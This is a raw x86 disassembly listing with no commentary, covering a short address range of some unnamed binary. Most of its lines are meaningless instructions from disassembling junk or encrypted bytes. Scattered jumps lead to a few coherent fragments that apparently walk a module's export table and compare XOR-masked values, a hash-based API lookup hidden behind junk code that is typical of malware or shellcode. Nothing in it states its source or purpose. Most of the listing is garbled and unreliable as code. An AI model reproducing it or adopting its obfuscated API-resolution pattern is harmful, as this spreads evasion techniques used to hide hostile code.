  40b90e:	out    dx,eax
  40b90f:	icebp  
  40b910:	leave  
  40b911:	xchg   ecx,eax
  40b912:	sub    eax,0x3ea72046
  40b917:	cmp    DWORD PTR [esi-0x2728ddad],eax
  40b91d:	cli    
  40b91e:	push   ebp
  40b91f:	jl     0x40b980
  40b921:	(bad)  
  40b922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b923:	retf   
  40b924:	js     0x40b90f
  40b926:	into   
  40b927:	ja     0x40b94c
  40b929:	adc    dh,ch
  40b92b:	pusha  
  40b92c:	addr16 retf 0x7c0f
  40b930:	pop    ds
  40b931:	gs add al,0x26
  40b934:	mov    es,WORD PTR [ecx]
  40b936:	aad    0x6f
  40b938:	mov    ds:0x8bd44d89,eax
  40b93d:	inc    ebp
  40b93e:	in     al,dx
  40b93f:	mov    ecx,DWORD PTR [ebp+0x8]
  40b942:	add    ecx,DWORD PTR [eax+0x1c]
  40b945:	xor    esi,esi
  40b947:	mov    DWORD PTR [ebp-0x14],ecx
  40b94a:	mov    eax,DWORD PTR [ebp-0x28]
  40b94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40b950:	add    ecx,DWORD PTR [eax+edi*4]
  40b953:	jmp    0x40ba38
  40b958:	pop    ss
  40b959:	pusha  
  40b95a:	pop    esp
  40b95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95c:	jns    0x40b916
  40b95e:	out    0x61,eax
  40b960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b961:	push   ds
  40b962:	jg     0x40b96d
  40b964:	(bad)
  40b968:	jns    0x40b99d
  40b96a:	jle    0x40b9ea
  40b96c:	mov    dh,0x7e
  40b96e:	jle    0x40b9ee
  40b970:	daa    
  40b971:	outs   dx,DWORD PTR ds:[esi]
  40b972:	dec    esi
  40b973:	xlat   BYTE PTR ds:[ebx]
  40b974:	pop    esp
  40b975:	fincstp 
  40b977:	daa    
  40b978:	pop    ds
  40b979:	or     DWORD PTR [ecx+0x4c917bc1],ebp
  40b97f:	dec    esi
  40b980:	lods   al,BYTE PTR ds:[esi]
  40b981:	pop    ebp
  40b982:	lea    ebp,[ebx-0x3f]
  40b985:	adc    ebx,ebp
  40b987:	stos   BYTE PTR es:[edi],al
  40b988:	bound  esp,QWORD PTR [ebx+0x46029bb]
  40b98e:	mov    bh,0xaa
  40b990:	pop    ebp
  40b991:	xchg   edi,eax
  40b992:	repz (bad) 
  40b994:	and    DWORD PTR [ecx+0x391d00cd],0xffffff8b
  40b99b:	or     al,BYTE PTR [ecx]
  40b99d:	push   ds
  40b99e:	unpcklps xmm5,XMMWORD PTR [edi]
  40b9a1:	jecxz  0x40b99b
  40b9a3:	jo     0x40b9c3
  40b9a5:	std    
  40b9a6:	je     0x40b9cc
  40b9a8:	lea    ecx,[edx+0x78]
  40b9ab:	sub    al,dl
  40b9ad:	arpl   WORD PTR [edi-0x3d],bp
  40b9b0:	ret    0xf9bc
  40b9b3:	jae    0x40b9b1
  40b9b5:	dec    ebp
  40b9b6:	xor    eax,0x30a6b95
  40b9bb:	xor    al,0x31
  40b9bd:	aaa    
  40b9be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9bf:	add    dl,dl
  40b9c1:	dec    ecx
  40b9c2:	aas    
  40b9c3:	push   ss
  40b9c4:	xchg   esp,eax
  40b9c5:	scas   eax,DWORD PTR es:[edi]
  40b9c6:	cmp    DWORD PTR [edi+0x50],ecx
  40b9c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9ca:	ror    BYTE PTR [esi],1
  40b9cc:	imul   esi,DWORD PTR [esi-0x551ddeb3],0xffffffd5
  40b9d3:	call   0x444e:0xf3581b04
  40b9da:	push   esp
  40b9db:	pop    ebp
  40b9dc:	pop    edx
  40b9dd:	mov    al,ds:0xcf1364c0
  40b9e2:	call   0x844a94ab
  40b9e7:	fist   DWORD PTR [ebx+0x6c]
  40b9ea:	xor    bh,BYTE PTR [ebx]
  40b9ec:	pop    ebp
  40b9ed:	icebp  
  40b9ee:	mov    bl,0x1c
  40b9f0:	add    eax,0xe897ec7b
  40b9f5:	fwait
  40b9f6:	push   ebx
  40b9f7:	inc    esp
  40b9f8:	adc    ebp,DWORD PTR [edx+0x19]
  40b9fb:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40b9fd:	and    ch,BYTE PTR [eax-0x51794d80]
  40ba03:	out    0x70,al
  40ba05:	xchg   ecx,eax
  40ba06:	mov    ?,WORD PTR [esi+0x23]
  40ba09:	pop    ebp
  40ba0a:	ss jmp 0x9483dce4
  40ba10:	data16 scas al,BYTE PTR es:[edi]
  40ba12:	mov    ch,0xe6
  40ba14:	and    BYTE PTR [edi+ebx*4-0x7dd961c4],dl
  40ba1b:	sub    bh,BYTE PTR [edx+0x7a]
  40ba1e:	add    al,0xf3
  40ba20:	inc    ecx
  40ba21:	or     ah,BYTE PTR [edx+edx*1-0x4a87ddbd]
  40ba28:	mov    ds:0xffc4c55d,al
  40ba2d:	xlat   BYTE PTR ds:[ebx]
  40ba2e:	xchg   edi,eax
  40ba2f:	adc    esp,DWORD PTR [esi-0x6275c87b]
  40ba35:	neg    DWORD PTR [edx-0x4a]
  40ba38:	lea    eax,[ebp-0x8]
  40ba3b:	mov    DWORD PTR [ebp-0x30],ecx
  40ba3e:	push   eax
  40ba3f:	push   DWORD PTR [ebp-0x30]
  40ba42:	push   DWORD PTR [ebp+0xc]
  40ba45:	call   0x408325
  40ba4a:	mov    eax,DWORD PTR [ebp-0x4]
  40ba4d:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba50:	xor    eax,0x7510859
  40ba55:	add    eax,ebx
  40ba57:	cmp    ecx,eax
  40ba59:	jne    0x40bb61
  40ba5f:	mov    eax,DWORD PTR [ebp-0x20]
  40ba62:	jmp    0x40bb47
  40ba67:	test   BYTE PTR [ebx+0x5b],al
  40ba6a:	scas   al,BYTE PTR es:[edi]
  40ba6b:	pop    ecx
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	jns    0x40bae8
  40ba6f:	and    BYTE PTR [ebx+0x63],cl
  40ba72:	lock sbb esi,DWORD PTR [edi]
  40ba75:	or     eax,0x7e30b1ae
  40ba7a:	jle    0x40ba32
  40ba7c:	jle    0x40bafc
  40ba7e:	jle    0x40ba45
  40ba80:	sahf   
  40ba81:	dec    esp
  40ba82:	xlat   BYTE PTR ds:[ebx]
  40ba83:	cdq    
  40ba84:	jno    0x40ba1c
  40ba86:	xor    al,0x4d
  40ba88:	push   es
  40ba89:	jge    0x40ba8d
  40ba8b:	cmc    
  40ba8c:	push   edx
  40ba8d:	hlt    
  40ba8e:	cmp    ecx,esp
  40ba90:	(bad)  
  40ba91:	sbb    dl,ch
  40ba93:	daa    
  40ba94:	stos   BYTE PTR es:[edi],al
  40ba95:	inc    ecx
  40ba96:	and    BYTE PTR [ecx+0x49d4c19d],dh
  40ba9c:	inc    esp
  40ba9d:	and    al,cl
  40ba9f:	sbb    al,0xf5
  40baa1:	jl     0x40bad0
  40baa3:	mov    eax,0x260d62fb
  40baa8:	leave  
  40baa9:	stos   DWORD PTR es:[edi],eax
  40baaa:	sub    eax,0x86b4fb28
  40baaf:	mov    ebp,0xc0deb580
  40bab4:	test   al,0x91
  40bab6:	push   ecx
  40bab7:	fisubr DWORD PTR [ebx-0x1fbd759f]
  40babd:	cmp    eax,DWORD PTR [edx+ecx*8]
  40bac0:	mov    bh,0xe4
  40bac2:	pop    ss
  40bac3:	in     eax,0x3a
  40bac5:	aas    
  40bac6:	push   esp
  40bac7:	int3   
  40bac8:	sub    DWORD PTR [edi-0x18],edi
  40bacb:	(bad)  
  40bacd:	(bad)  
  40bace:	imul   eax,DWORD PTR [esi+ebx*1+0x211af870],0x43
  40bad6:	dec    esp
  40bad7:	adc    eax,0xfb1f7147
  40badc:	imul   edx,DWORD PTR [ecx+0x54],0x30
  40bae0:	ret    0x1875
  40bae3:	or     BYTE PTR [edx-0x64],0xab
  40bae7:	push   ss
  40bae8:	fimul  WORD PTR [bp+si]
  40baeb:	push   ecx
  40baec:	out    0xd5,al
  40baee:	mov    edx,0xf166b12f
  40baf3:	mov    bl,0x93
  40baf5:	xchg   BYTE PTR [ebp-0x54],bl
  40baf8:	adc    BYTE PTR [edx+eiz*2],0x2a
  40bafc:	mov    esp,ds
  40bafe:	ror    dh,1
  40bb00:	movhps QWORD PTR [ecx],xmm0
  40bb03:	jg     0x40bb2b
  40bb05:	dec    esp
  40bb06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb07:	arpl   WORD PTR [edi],sp
  40bb09:	call   0x861:0x8428ac04
  40bb10:	mov    ds:0x66b1b22a,eax
  40bb15:	ins    BYTE PTR es:[edi],dx
  40bb16:	jg     0x40bb24
  40bb18:	adc    al,0x4d
  40bb1a:	and    DWORD PTR [ebx+0x21],0x95413f96
  40bb21:	fcomi  st,st(3)
  40bb23:	sub    edx,DWORD PTR [esi]
  40bb25:	or     al,0x66
  40bb27:	push   esp
  40bb28:	adc    ebp,DWORD PTR ds:0xcd892368
  40bb2e:	xchg   DWORD PTR [edx+0x4d],eax
  40bb31:	mov    ds:0x9ad8c06b,eax
  40bb36:	(bad)  
  40bb38:	jo     0x40bb5f
  40bb3a:	push   edx
  40bb3b:	inc    ebp
  40bb3c:	push   ss
  40bb3d:	stos   DWORD PTR es:[edi],eax
  40bb3e:	xor    BYTE PTR [esp+eax*1],bl
  40bb41:	adc    al,0x98
  40bb43:	mov    esp,0x47366947
  40bb48:	cmp    edi,eax
  40bb4a:	jb     0x40b2a5
  40bb50:	jmp    0x40bb71
  40bb55:	mov    eax,DWORD PTR [ebp-0x4]
  40bb58:	xor    eax,esi
  40bb5a:	add    eax,ebx
  40bb5c:	jmp    0x40c696
  40bb61:	mov    eax,DWORD PTR [ebp-0x2c]
  40bb64:	movzx  eax,WORD PTR [eax+edi*2]
  40bb68:	mov    ecx,DWORD PTR [ebp-0x14]
  40bb6b:	mov    eax,DWORD PTR [ecx+eax*4]
  40bb6e:	mov    DWORD PTR [ebp+0xc],eax
  40bb71:	mov    eax,DWORD PTR [ebp-0x4]
  40bb74:	mov    ecx,DWORD PTR [ebp-0x8]
  40bb77:	xor    eax,0x7510859
  40bb7c:	add    eax,ebx
  40bb7e:	cmp    ecx,eax
  40bb80:	jne    0x40bb93
  40bb86:	mov    eax,DWORD PTR [ebp-0x4]
  40bb89:	xor    eax,0x7510859
  40bb8e:	jmp    0x40bb5a
  40bb93:	mov    eax,DWORD PTR [ebp+0xc]
  40bb96:	add    eax,DWORD PTR [ebp+0x8]
  40bb99:	mov    DWORD PTR [ebp-0x10],eax
  40bb9c:	mov    eax,DWORD PTR [ebp-0x1c]
  40bb9f:	test   eax,eax
  40bba1:	je     0x40c2b4
  40bba7:	mov    DWORD PTR [ebp-0x24],esi
  40bbaa:	push   0xb
  40bbac:	pop    ecx
  40bbad:	push   0x5
  40bbaf:	dec    ecx
  40bbb0:	jmp    0x40bc95
  40bbb5:	pop    ss
  40bbb6:	imul   dh
  40bbb8:	mov    bl,0x6f
  40bbba:	jnp    0x40bb77
  40bbbc:	push   0xffffffce
  40bbbe:	pop    ecx
  40bbbf:	and    esi,ebx
  40bbc1:	sub    dh,BYTE PTR [ecx]
  40bbc3:	adc    edi,DWORD PTR [esi-0x77]
  40bbc6:	xor    DWORD PTR [esi+0x7e],edi
  40bbc9:	mov    dh,0x7e
  40bbcb:	jle    0x40bc4b
  40bbcd:	icebp  
  40bbce:	xchg   esp,eax
  40bbcf:	xchg   ecx,eax
  40bbd0:	ror    ch,0xc4
  40bbd3:	es pop edx
  40bbd5:	cmp    al,0x7e
  40bbd7:	cmp    dl,BYTE PTR [edx+0x22068aa7]
  40bbdd:	sti    
  40bbde:	or     DWORD PTR [esi+0x6c8f6428],edi
  40bbe4:	xor    ah,BYTE PTR [esi+eiz*2-0x68]
  40bbe8:	scas   al,BYTE PTR es:[edi]
  40bbe9:	dec    ecx
  40bbea:	pop    ds
  40bbeb:	jge    0x40bbf4
  40bbed:	cmp    ebx,ebx
  40bbef:	cmc    
  40bbf0:	mov    al,0x1b
  40bbf2:	(bad)  
  40bbf3:	mov    ecx,DWORD PTR [ecx]
  40bbf5:	mov    ?,WORD PTR [ebx-0x52]
  40bbf8:	push   0xb511ed3c
  40bbfd:	ret    
  40bbfe:	adc    ah,BYTE PTR [edx-0x62c2154f]
  40bc04:	or     BYTE PTR [ebx],bl
  40bc06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc07:	nop
  40bc08:	mov    BYTE PTR [ebp-0x22],dl
  40bc0b:	pusha  
  40bc0c:	xchg   esi,eax
  40bc0d:	dec    esi
  40bc0e:	int    0x3c
  40bc10:	adc    BYTE PTR [edx],al
  40bc12:	pop    edi
  40bc13:	aas    
  40bc14:	jo     0x40bbfc
  40bc16:	cmc    
  40bc17:	mov    ds:0xa9d75da5,al
  40bc1c:	or     al,0x6a
  40bc1e:	mov    ebp,0x8871f9cd
  40bc23:	xchg   esi,eax
  40bc24:	mov    ebx,0xc004c73
  40bc29:	call   0x6748:0xc4201855
  40bc30:	pop    ds
  40bc31:	and    cl,ch
  40bc33:	jl     0x40bbfc
  40bc35:	mov    WORD PTR [edi-0xc82996f],?
  40bc3b:	idiv   BYTE PTR [esi]
  40bc3d:	retf   0xbe36
  40bc40:	stos   DWORD PTR es:[edi],eax
  40bc41:	xchg   esi,eax
  40bc42:	push   edx
  40bc43:	or     DWORD PTR [ebp-0x21],0xa33a4d6d
  40bc4a:	fs ja  0x40bcb1
  40bc4d:	(bad)  
  40bc4e:	pop    edi
  40bc4f:	xchg   ecx,eax
  40bc50:	adc    eax,0x981d10e8
  40bc55:	int3   
  40bc56:	add    BYTE PTR [eax+0x62],bh
  40bc59:	sub    ebp,DWORD PTR [eax]
  40bc5b:	cmc    
  40bc5c:	dec    eax
  40bc5d:	loope  0x40bc82
  40bc5f:	inc    edi
  40bc60:	lds    esp,FWORD PTR [edi]
  40bc62:	cmp    BYTE PTR [eax],bh
  40bc64:	mov    esp,esi
  40bc66:	add    eax,0xb9f5eaee
  40bc6b:	jne    0x40bbfb
  40bc6d:	adc    BYTE PTR [ebp+0x1],dl
  40bc70:	and    dl,ch
  40bc72:	jmp    DWORD PTR [ebx+0x1ac34a83]
  40bc78:	dec    esp
  40bc79:	dec    edx
  40bc7a:	in     eax,0x69
  40bc7c:	or     cl,BYTE PTR [esp+edi*8]
  40bc7f:	mov    esi,0xd292d10
  40bc84:	data16 jbe 0x40bc9b
  40bc87:	push   edx
  40bc88:	dec    edi
  40bc89:	pop    ecx
  40bc8a:	fwait
  40bc8b:	lds    eax,FWORD PTR [esi-0x6d]
  40bc8e:	in     al,dx
  40bc8f:	loopne 0x40bce2
  40bc91:	pop    ebx
  40bc92:	inc    ecx
  40bc93:	aas    
  40bc94:	mov    bl,BYTE PTR [ebx-0x79]
  40bc97:	retf   
  40bc98:	sub    ebx,ecx
  40bc9a:	xchg   ebx,ecx
  40bc9c:	dec    ecx
  40bc9d:	mov    eax,DWORD PTR [ebp-0x1c]
  40bca0:	imul   eax,ecx
  40bca3:	sub    esp,eax
  40bca5:	mov    DWORD PTR [ebp-0x24],esp
  40bca8:	mov    eax,DWORD PTR [ebp-0x4]
  40bcab:	mov    ecx,0x7510859
  40bcb0:	jmp    0x40bd95
  40bcb5:	xchg   edi,eax
  40bcb6:	adc    DWORD PTR [ecx+eax*2+0x78],0x79
  40bcbb:	mov    ebx,0xdff72d79
  40bcc0:	ins    DWORD PTR es:[edi],dx
  40bcc1:	xchg   edx,eax
  40bcc2:	and    BYTE PTR [esp+edx*4],0xc1
  40bcc6:	ss jle 0x40bd47
  40bcc9:	mov    dh,0x7e
  40bccb:	jle    0x40bd4b
  40bccd:	ror    DWORD PTR [eax+0x7bcc3b27],0xac
  40bcd4:	mov    ds,WORD PTR [edi]
  40bcd6:	lods   eax,DWORD PTR ds:[esi]
  40bcd7:	ret    
  40bcd8:	sbb    ch,cl
  40bcda:	repz pop edi
  40bcdc:	mov    edx,0xf9797d6b
  40bce1:	es push ebp
  40bce3:	inc    edi
  40bce4:	fdivp  st(3),st
  40bce6:	stos   BYTE PTR es:[edi],al
  40bce7:	leave  
  40bce8:	xchg   esi,eax
  40bce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcea:	and    eax,DWORD PTR [ecx+0x7c3da27c]
  40bcf0:	into   
  40bcf1:	fs stc 
  40bcf3:	and    eax,0xe5cef726
  40bcf8:	pop    edi
  40bcf9:	sti    
  40bcfa:	xchg   ecx,eax
  40bcfb:	mov    esp,0x5fa9411c
  40bd00:	pop    eax
  40bd01:	adc    DWORD PTR [esi+0x1],ebp
  40bd04:	ss pop edx
  40bd06:	pmovmskb esp,mm4
  40bd09:	adc    bl,BYTE PTR [ecx+0x72]
  40bd0c:	cld    
  40bd0d:	add    ebx,DWORD PTR [edi]
  40bd0f:	and    al,0x23
  40bd11:	push   eax
  40bd12:	div    DWORD PTR [ecx+ecx*8-0x677a572d]
  40bd19:	jo     0x40bd6c
  40bd1b:	je     0x40bd76
  40bd1d:	mov    eax,0xe35dfe8d
  40bd22:	rcr    BYTE PTR [esi+0x58a9f6d8],cl
  40bd28:	mov    bh,0x30
  40bd2a:	dec    eax
  40bd2b:	jns    0x40bd9b
  40bd2d:	mov    edx,0xa2129ee5
  40bd32:	int    0x61
  40bd34:	inc    ebp
  40bd35:	adc    edi,DWORD PTR [ebx+0xd]
  40bd38:	xor    DWORD PTR [ebp-0x268e0f76],ebp
  40bd3e:	mov    al,ds:0x34332485
  40bd43:	scas   eax,DWORD PTR es:[edi]
  40bd44:	fs (bad) 
  40bd47:	fistp  WORD PTR [edi-0x34a88fbd]
  40bd4d:	frstor [eax+0x1201da24]
  40bd53:	sahf   
  40bd54:	adc    al,0xe6
  40bd56:	mov    ch,0xf
  40bd58:	les    ecx,FWORD PTR [edx+0x53]
  40bd5b:	loopne 0x40bd84
  40bd5d:	pushf  
  40bd5e:	data16 imul BYTE PTR [ebx-0x7b185e24]
  40bd65:	iret   
  40bd66:	out    dx,eax
  40bd67:	mov    al,0xf0
  40bd69:	add    al,0xc7
  40bd6b:	out    dx,eax
  40bd6c:	mov    BYTE PTR [edi+0xd0ac91b],ah
  40bd72:	sbb    al,0x4
  40bd74:	mov    ds:0x6488fad2,al
  40bd79:	dec    si
  40bd7b:	(bad)  
  40bd7c:	fdivr  QWORD PTR [ecx+0x76]
  40bd7f:	sub    eax,0xe5441456
  40bd84:	jge    0x40bdf0
  40bd86:	rcr    BYTE PTR [esp+edx*1],1
  40bd89:	addr16 mov dh,0x52
  40bd8c:	fist   DWORD PTR [edx-0x21d29ea3]
  40bd92:	mov    WORD PTR [esi],es
  40bd94:	mov    ah,0x33
  40bd96:	sar    DWORD PTR [edx+0x32729f],0x3
  40bd9d:	ret    0x4589
  40bda0:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  40bda6:	add    eax,edx
  40bda8:	mov    edx,DWORD PTR [ebp+0x14]
  40bdab:	jmp    0x40be90
  40bdb0:	dec    DWORD PTR [ebx-0x47d6c7ef]
  40bdb6:	xchg   DWORD PTR [ecx-0x43979b07],edi
  40bdbc:	stos   BYTE PTR es:[edi],al
  40bdbd:	dec    ecx
  40bdbe:	fcomip st,st(6)
  40bdc0:	sbb    DWORD PTR [edi],esi
  40bdc2:	jle    0x40be42
  40bdc4:	mov    dh,0x7e
  40bdc6:	jle    0x40be46
  40bdc8:	test   BYTE PTR [edx-0x5bac51d7],bl
  40bdce:	cmp    eax,0x2e123605
  40bdd3:	jnp    0x40be13
  40bdd5:	cmp    dl,dh
  40bdd7:	and    DWORD PTR [esp+ecx*4+0x18990ab5],eax
  40bdde:	and    bl,BYTE PTR [eax]
  40bde0:	push   ebp
  40bde1:	add    BYTE PTR [edi+eax*8+0x6c],ah
  40bde5:	mov    ds:0xcbb82e23,eax
  40bdea:	call   0xbd28:0x7127563
  40bdf1:	iret   
  40bdf2:	mov    DWORD PTR [ecx+0x6e],ebx
  40bdf5:	enter  0xea0e,0x13
  40bdf9:	in     eax,dx
  40bdfa:	jae    0x40be5f
  40bdfc:	loope  0x40bdb5
  40bdfe:	inc    edx
  40bdff:	jle    0x40bd9e
  40be01:	cmp    BYTE PTR [edx+ebp*2],cl
  40be04:	and    eax,0x80b50bd
  40be09:	mov    dh,0xdc
  40be0b:	sahf   
  40be0c:	pop    fs
  40be0e:	dec    edx
  40be0f:	xchg   edx,eax
  40be10:	add    al,0xdf
  40be12:	cmp    edx,0xffffffa1
  40be15:	sar    DWORD PTR [edi+eax*2+0x10c16a5d],0xa7
  40be1d:	jl     0x40be0e
  40be1f:	imul   edx,DWORD PTR [ebx+edi*1],0xa31feb84
  40be26:	pop    ss
  40be27:	shl    DWORD PTR [edx],cl
  40be29:	icebp  
  40be2a:	mov    al,0xe3
  40be2c:	adc    bl,0x32
  40be2f:	dec    ebp
  40be30:	mov    esi,0xa7ad839a
  40be35:	xchg   ebx,eax
  40be36:	mov    dl,0x6
  40be38:	in     eax,dx
  40be39:	pop    esp
  40be3a:	dec    ebx
  40be3b:	test   al,0x7d
  40be3d:	mov    edx,0x8512fdc1
  40be42:	xchg   ebp,eax
  40be43:	lock pop es
  40be45:	push   esi
  40be46:	in     al,dx
  40be47:	add    ah,cl
  40be49:	shl    BYTE PTR [eax],cl
  40be4b:	pop    esi
  40be4c:	das    
  40be4d:	imul   edi,DWORD PTR cs:[eax-0x62],0xd9da7e0a
  40be55:	mov    cl,0x6c
  40be57:	sbb    dl,bl
  40be59:	push   es
  40be5a:	mov    ds:0x405952f4,al
  40be5f:	or     eax,0x2c261ede
  40be64:	add    eax,0xa0fd8d91
  40be69:	mov    ds:0x1d69f141,eax
  40be6e:	mov    ebx,0x955a9610
  40be73:	sbb    ecx,DWORD PTR [esi+0x44918095]
  40be79:	jae    0x40bee5
  40be7b:	jmp    0x6bd3:0xa501b372
  40be82:	aas    
  40be83:	mov    ch,0xc
  40be85:	test   eax,0xaec9f0f
  40be8a:	sub    eax,edx
  40be8c:	or     ah,0x4a
  40be8f:	inc    ebx
  40be90:	imul   eax,DWORD PTR [edx]
  40be93:	jmp    0x40bf78
  40be98:	inc    ebp
  40be99:	loop   0x40be83
  40be9b:	xchg   edi,eax
  40be9c:	imul   esp,DWORD PTR [ebp-0x36f31fa7],0x274d7640
  40bea6:	push   ds
  40bea7:	das    
  40bea8:	push   ecx
  40bea9:	aaa    
  40beaa:	jle    0x40bf2a
  40beac:	mov    dh,0x7e
  40beae:	jle    0x40bf2e
  40beb0:	dec    edi
  40beb1:	pop    es
  40beb2:	pop    eax
  40beb3:	hlt    
  40beb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40beb5:	das    
  40beb6:	out    dx,eax
  40beb7:	ds jle 0x40bf34
  40beba:	xor    al,0x4d
  40bebc:	fisubr DWORD PTR [edx]
  40bebe:	rol    BYTE PTR [edx+0xb],cl
  40bec1:	imul   ecx,esp,0x53
  40bec4:	dec    ebp
  40bec5:	iret   
  40bec6:	ror    DWORD PTR [ebp+0x27b2bd4c],cl
  40becc:	sahf   
  40becd:	or     edi,DWORD PTR [ecx+0x3580a100]
  40bed3:	pop    ebx
  40bed4:	stos   BYTE PTR es:[edi],al
  40bed5:	adc    bh,BYTE PTR [edi+eax*8-0x4c198c76]
  40bedc:	aam    0x65
  40bede:	pop    ebp
  40bedf:	retf   
  40bee0:	jno    0x40be7c
  40bee2:	mov    cl,0xb
  40bee4:	mov    fs,WORD PTR [ecx]
  40bee6:	adc    DWORD PTR [esi+0x55],edx
  40bee9:	in     eax,dx
  40beea:	enter  0x7325,0x9a
  40beee:	lock lods al,BYTE PTR ds:[esi]
  40bef0:	shl    DWORD PTR [esi-0x7af4114b],cl
  40bef6:	data16 js 0x40bedb
  40bef9:	les    esp,FWORD PTR ds:0x7fdbc413
  40beff:	sub    ecx,DWORD PTR [esi-0x7d]
  40bf02:	and    DWORD PTR [edx-0x56],esi
  40bf05:	into   
  40bf06:	xchg   esp,eax
  40bf07:	in     al,0xb1
  40bf09:	sub    eax,0xadb3626d
  40bf0e:	mov    bh,0x60
  40bf10:	out    dx,eax
  40bf11:	pushf  
  40bf12:	call   0x4b1e:0xc16cb8ff
  40bf19:	mov    bh,0xbb
  40bf1b:	ds sub al,0xbe
  40bf1e:	mov    ebp,0xc433de6b
  40bf23:	imul   eax,ebx,0xffffffb0
  40bf26:	repz mov dh,0x7c
  40bf29:	out    0xa4,eax
  40bf2b:	das    
  40bf2c:	adc    ch,BYTE PTR [edx-0x5bb901f]
  40bf32:	stos   DWORD PTR es:[edi],eax
  40bf33:	shl    BYTE PTR [ebx],0xf7
  40bf36:	jae    0x40bf7d
  40bf38:	bound  edx,QWORD PTR [ebx-0x2]
  40bf3b:	stc    
  40bf3c:	in     al,dx
  40bf3d:	fsubr  st(6),st
  40bf3f:	sbb    ah,BYTE PTR ds:0xe866e35c
  40bf45:	icebp  
  40bf46:	mov    bl,BYTE PTR [eax]
  40bf48:	adc    al,0x6a
  40bf4a:	mov    cl,0x74
  40bf4c:	sub    esp,esp
  40bf4e:	xor    DWORD PTR [eax-0x63],esp
  40bf51:	xchg   ah,ah
  40bf53:	push   edx
  40bf54:	jmp    DWORD PTR [eax]
  40bf56:	sub    al,0x62
  40bf58:	mov    edi,db7
  40bf5b:	xchg   DWORD PTR [edx+0x47],edx
  40bf5e:	(bad)  
  40bf5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf60:	dec    edx
  40bf61:	pushf  
  40bf62:	xchg   edi,eax
  40bf63:	push   ds
  40bf64:	jp     0x40bf95
  40bf66:	aaa    
  40bf67:	pop    ds
  40bf68:	sbb    esi,DWORD PTR [eax-0x5d]
  40bf6b:	fsubr  st(5),st
  40bf6d:	popw   ds
  40bf6f:	mov    bh,0x29
  40bf71:	pop    esp
  40bf72:	in     eax,dx
  40bf73:	leave  
  40bf74:	loop   0x40bf24
  40bf76:	xchg   ebx,eax
  40bf77:	jnp    0x40bf04
  40bf79:	push   ebp
  40bf7a:	cld    
  40bf7b:	xor    edx,ecx
  40bf7d:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf80:	lea    ecx,[edx+ecx*1+0x32729f]
  40bf87:	cmp    ecx,eax
  40bf89:	je     0x40c1ca
  40bf8f:	mov    edi,DWORD PTR [ebp-0x18]
  40bf92:	mov    eax,DWORD PTR [ebp+0x8]
  40bf95:	mov    edx,DWORD PTR [ebp+0x14]
  40bf98:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40bf9c:	jmp    0x40c081
  40bfa1:	pop    ss
  40bfa2:	sub    al,0x93
  40bfa4:	sub    edi,DWORD PTR [ecx+0x192097b9]
  40bfaa:	jne    0x40bf81
  40bfac:	stos   BYTE PTR es:[edi],al
  40bfad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfae:	or     cl,al
  40bfb0:	dec    ebx
  40bfb1:	test   eax,0xb67e7e34
  40bfb6:	jle    0x40c036
  40bfb8:	jle    0x40bf72
  40bfba:	test   BYTE PTR [esp+ebx*2],bh
  40bfbd:	data16 shl bh,0xe1
  40bfc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfc2:	sti    
  40bfc3:	cmp    ch,0x14
  40bfc6:	das    
  40bfc7:	add    ebx,DWORD PTR [edi-0x65f94f61]
  40bfcd:	xor    ebp,DWORD PTR [edx-0x3d]
  40bfd0:	inc    esp
  40bfd1:	lods   eax,DWORD PTR ds:[esi]
  40bfd2:	adc    DWORD PTR ds:0x869fa21c,ecx
  40bfd8:	inc    edx
  40bfd9:	sbb    ah,dh
  40bfdb:	popa   
  40bfdc:	pop    ebx
  40bfdd:	fisttp WORD PTR [ecx-0x755eb6e0]
  40bfe3:	outs   dx,DWORD PTR ds:[esi]
  40bfe4:	dec    esp
  40bfe5:	cmp    eax,esp
  40bfe7:	mov    ds:0xe2921eba,eax
  40bfec:	fs push edx
  40bfee:	mov    ch,0xb5
  40bff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bff1:	sub    DWORD PTR [edx-0xf1df1d],ebp
  40bff7:	adc    al,0x1a
  40bff9:	dec    edi
  40bffa:	pushf  
  40bffb:	lea    esp,ds:0x1afb515e
  40c001:	mov    WORD PTR ds:0x68af065b,fs
  40c007:	fs loopne 0x40c062
  40c00a:	jno    0x40bfe9
  40c00c:	lods   al,BYTE PTR ds:[esi]
  40c00d:	pop    edi
  40c00e:	fcmovnbe st,st(6)
  40c010:	jbe    0x40bfde
  40c012:	retf   
  40c013:	pop    esp
  40c014:	retf   0x5f91
  40c017:	adc    ch,al
  40c019:	aam    0x85
  40c01b:	loop   0x40c036
  40c01d:	retf   
  40c01e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c01f:	jmp    0x40bff7
  40c021:	mov    ebx,DWORD PTR [edx]
  40c023:	push   edx
  40c024:	pop    eax
  40c025:	jb     0x40c08c
  40c027:	in     eax,0x14
  40c029:	push   ebx
  40c02a:	stc    
  40c02b:	dec    ecx
  40c02c:	iret   
  40c02d:	not    BYTE PTR [eax+eax*4-0x24]
  40c031:	add    al,0x6c
  40c033:	jg     0x40bfdf
  40c035:	adc    esi,DWORD PTR [edx]
  40c037:	xchg   BYTE PTR [eax],ah
  40c039:	jnp    0x40bfc7
  40c03b:	ja     0x40c0b4
  40c03d:	pusha  
  40c03e:	ins    BYTE PTR es:[edi],dx
  40c03f:	or     ch,dh
  40c041:	mov    WORD PTR [edi],gs
  40c043:	int    0x2b
